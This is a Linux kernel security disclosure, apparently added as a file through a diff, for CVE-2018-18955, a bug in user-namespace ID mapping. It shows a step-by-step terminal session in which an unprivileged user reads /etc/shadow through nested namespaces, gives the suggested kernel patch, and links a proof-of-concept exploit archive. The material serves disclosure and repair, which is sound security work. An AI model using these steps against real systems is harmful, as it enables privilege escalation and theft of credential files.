@@ -1,0 +1,177 @@
+commit 6397fac4915a ("userns: bump idmap limits to 340") increases the number of
+possible uid/gid mappings that a namespace can have from 5 to 340. This is
+implemented by switching to a different data structure if the number of mappings
+exceeds 5: Instead of linear search over an unsorted array of struct
+uid_gid_extent, binary search over a sorted array of struct uid_gid_extent is
+used. Because ID mappings are queried in both directions (kernel ID to
+namespaced ID and namespaced ID to kernel ID), two copies of the array are
+created, one per direction, and they are sorted differently.
+
+In map_write(), at first, during the loop that calls insert_extent(), the member
+lower_first of each struct uid_gid_extent contains an ID in the parent
+namespace. Later, map_id_range_down() is used in a loop to replace these IDs in
+the parent namespace with kernel IDs.
+
+The problem is that, when the two sorted arrays are used, the new code omits the
+ID transformation for the kernel->namespaced mapping; only the
+namespaced->kernel mapping is transformed appropriately.
+
+This means that if you first, from the init namespace, create a user namespace
+NS1 with the following uid_map:
+
+    0 100000 1000
+
+and then, from NS1, create a nested user namespace NS2 with the following
+uid_map:
+
+    0 0 1
+    1 1 1
+    2 2 1
+    3 3 1
+    4 4 1
+    5 5 995
+
+then make_kuid(NS2, ...) will work properly, but from_kuid(NS2) will be an
+identity mapping for UIDs in the range 0..1000.
+
+Most users of from_kuid() are relatively boring, but kuid_has_mapping() is used
+in inode_owner_or_capable() and privileged_wrt_inode_uidgid(); so you can abuse
+this to gain the ability to override DAC security controls on files whose IDs
+aren't mapped in your namespace.
+
+
+To test this, I installed the "uidmap" package in a Ubuntu 18.04 VM with the
+following /etc/subuid and /etc/subgid:
+
+user@ubuntu-18-04-vm:~$ cat /etc/subuid
+user:100000:65536
+user2:165536:65536
+user3:231072:65536
+user@ubuntu-18-04-vm:~$ cat /etc/subgid
+user:100000:65536
+user2:165536:65536
+user3:231072:65536
+user@ubuntu-18-04-vm:~$
+
+
+Then, as the user "user", I compiled the two attached helpers (subuid_shell.c
+and subshell.c):
+
+user@ubuntu-18-04-vm:~/userns_4_15$ gcc -o subuid_shell subuid_shell.c
+user@ubuntu-18-04-vm:~/userns_4_15$ gcc -o subshell subshell.c
+
+subuid_shell.c uses the newuidmap helper to set up a namespace that maps 1000
+UIDs starting at 100000 to the namespaced UID 0; subshell.c requires namespaced
+CAP_SYS_ADMIN and creates a user namespace that maps UIDs 0-999, using six
+extents.
+
+I used them as follows to read /etc/shadow:
+
+user@ubuntu-18-04-vm:~/userns_4_15$ id
+uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
+user@ubuntu-18-04-vm:~/userns_4_15$ ls -l /etc/shadow
+-rw-r----- 1 root shadow 1519 Jul  4 16:11 /etc/shadow
+user@ubuntu-18-04-vm:~/userns_4_15$ head -n1 /etc/shadow
+head: cannot open '/etc/shadow' for reading: Permission denied
+user@ubuntu-18-04-vm:~/userns_4_15$ ./subuid_shell 
+root@ubuntu-18-04-vm:~/userns_4_15# id
+uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
+root@ubuntu-18-04-vm:~/userns_4_15# cat /proc/self/uid_map
+         0     100000       1000
+root@ubuntu-18-04-vm:~/userns_4_15# ls -l /etc/shadow
+-rw-r----- 1 nobody nogroup 1519 Jul  4 16:11 /etc/shadow
+root@ubuntu-18-04-vm:~/userns_4_15# head -n1 /etc/shadow
+head: cannot open '/etc/shadow' for reading: Permission denied
+root@ubuntu-18-04-vm:~/userns_4_15# ./subshell 
+nobody@ubuntu-18-04-vm:~/userns_4_15$ id
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
+nobody@ubuntu-18-04-vm:~/userns_4_15$ cat /proc/self/uid_map
+         0          0          1
+         1          1          1
+         2          2          1
+         3          3          1
+         4          4          1
+         5          5        995
+nobody@ubuntu-18-04-vm:~/userns_4_15$ ls -l /etc/shadow
+-rw-r----- 1 root shadow 1519 Jul  4 16:11 /etc/shadow
+nobody@ubuntu-18-04-vm:~/userns_4_15$ head -n1 /etc/shadow
+root:!:17696:0:99999:7:::
+nobody@ubuntu-18-04-vm:~/userns_4_15$ 
+
+
+Here is a suggested patch (copy attached to avoid whitespace issues); does this
+look sensible?
+
+==================
+From 20598025d5e80f26a0c4306ebeca14b31539bd97 Mon Sep 17 00:00:00 2001
+From: Jann Horn <jannh@google.com>
+Date: Mon, 5 Nov 2018 20:55:09 +0100
+Subject: [PATCH] userns: also map extents in the reverse map to kernel IDs
+
+The current logic first clones the extent array and sorts both copies, then
+maps the lower IDs of the forward mapping into the lower namespace, but
+doesn't map the lower IDs of the reverse mapping.
+
+This means that code in a nested user namespace with >5 extents will see
+incorrect IDs. It also breaks some access checks, like
+inode_owner_or_capable() and privileged_wrt_inode_uidgid(), so a process
+can incorrectly appear to be capable relative to an inode.
+
+To fix it, we have to make sure that the "lower_first" members of extents
+in both arrays are translated; and we have to make sure that the reverse
+map is sorted *after* the translation (since otherwise the translation can
+break the sorting).
+
+This is CVE-2018-18955.
+
+Fixes: 6397fac4915a ("userns: bump idmap limits to 340")
+Cc: stable@vger.kernel.org
+Signed-off-by: Jann Horn <jannh@google.com>
+---
+ kernel/user_namespace.c | 12 ++++++++----
+ 1 file changed, 8 insertions(+), 4 deletions(-)
+
+diff --git a/kernel/user_namespace.c b/kernel/user_namespace.c
+index e5222b5fb4fe..923414a246e9 100644
+--- a/kernel/user_namespace.c
++++ b/kernel/user_namespace.c
+@@ -974,10 +974,6 @@ static ssize_t map_write(struct file *file, const char __user *buf,
+        if (!new_idmap_permitted(file, ns, cap_setid, &new_map))
+                goto out;
+ 
+-       ret = sort_idmaps(&new_map);
+-       if (ret < 0)
+-               goto out;
+-
+        ret = -EPERM;
+        /* Map the lower ids from the parent user namespace to the
+         * kernel global id space.
+@@ -1004,6 +1000,14 @@ static ssize_t map_write(struct file *file, const char __user *buf,
+                e->lower_first = lower_first;
+        }
+ 
++       /*
++        * If we want to use binary search for lookup, this clones the extent
++        * array and sorts both copies.
++        */
++       ret = sort_idmaps(&new_map);
++       if (ret < 0)
++               goto out;
++
+        /* Install the map */
+        if (new_map.nr_extents <= UID_GID_MAP_MAX_BASE_EXTENTS) {
+                memcpy(map->extent, new_map.extent,
+-- 
+2.19.1.930.g4563a0d9d0-goog
+==================
+
+
+(By the way: map_id_up_max() is probably pretty inefficient, especially when
+retpoline mitigations are on, because it uses bsearch(), which is basically a
+little bit of logic glue around indirect function calls. If you care about
+speed, you might want to add an inline variant of bsearch() for places like
+this.)
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
